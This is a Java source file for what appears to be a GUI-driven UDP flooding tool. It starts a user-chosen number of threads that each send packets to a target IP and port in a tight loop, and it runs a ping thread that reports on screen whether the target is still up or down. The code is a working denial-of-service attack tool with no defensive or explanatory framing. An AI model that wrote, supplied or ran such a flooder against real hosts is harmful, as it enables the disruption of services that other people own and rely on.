package madmeg.infinity.plus.main;

import madmeg.infinity.plus.main.GUI.gui;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.util.GregorianCalendar;
import java.util.concurrent.TimeUnit;

class ping extends Thread{
    private Multithread multithread = new Multithread();
    private String _ip;

    public ping(String ip){
        _ip = ip;
    }

    public void run(){
        try{

            boolean up = true;
            boolean ipNull = false;
            int count = 0;
            if (_ip == null){
                return;
            }
            InetAddress inet = InetAddress.getByName(_ip);
            while (up = true){

                long finish = 0;
                long start = new GregorianCalendar().getTimeInMillis();
                if (inet.isReachable(5000)) {
                    finish = new GregorianCalendar().getTimeInMillis();
                    gui.lbl4.setText("Ping RTT:" + (finish - start + "ms"));
                    up = true;
                } else {
                    count++;
                    gui.lbl4.setText("Ip Down for " + count + " pings");
                }
                TimeUnit.SECONDS.sleep(1);
            }

        }catch (Exception e){
            gui.lbl4.setText("Error");
        }

    }

}


class ThreadingTest extends Thread {
    private String ip1;
    private int port1;
    private int timeOut1;
    private int count = 0;
    private PrintWriter out;
    private Multithread Multithread = new Multithread();
    byte buf[] = null;
    InetAddress ip3;


    public ThreadingTest(String ip, int port, int timeOut) throws Exception {
        ip1 = ip;
        port1 = port;
        timeOut1 = timeOut;
        ip3 = InetAddress.getByName(ip1);
        String in = "GET/" + ip1 + "HTTP/1.1\r\n";
        buf = in.getBytes();
    }


    public void run() {

        try {
            while (count < (timeOut1*600)) {
                DatagramSocket ds = new DatagramSocket();
                DatagramPacket DpSend = new DatagramPacket(buf, buf.length, ip3, port1);
                ds.connect(ip3, port1);
                ds.send(DpSend);
                ds.close();
                Thread.sleep(1);
                count++;
            }
        } catch (InterruptedException e) {
        } catch (IOException e) {
        }
    }
}


public class Multithread
{
    private static String ip;
    private static int port;
    private static int timeOut;
    private static int threads;


    public static void main(String s, String p, String t, String time) throws Exception {
        ip = s;
        port = Integer.parseInt(p);
        timeOut = Integer.parseInt(time);
        threads = Integer.parseInt(t);

        Thread Ping = new Thread(new ping(ip));
        Ping.start();

        for (int i=0; i<threads; i++)
        {
            Thread object = new Thread(new ThreadingTest(ip, port, timeOut));
            object.start();
        }
    }
}

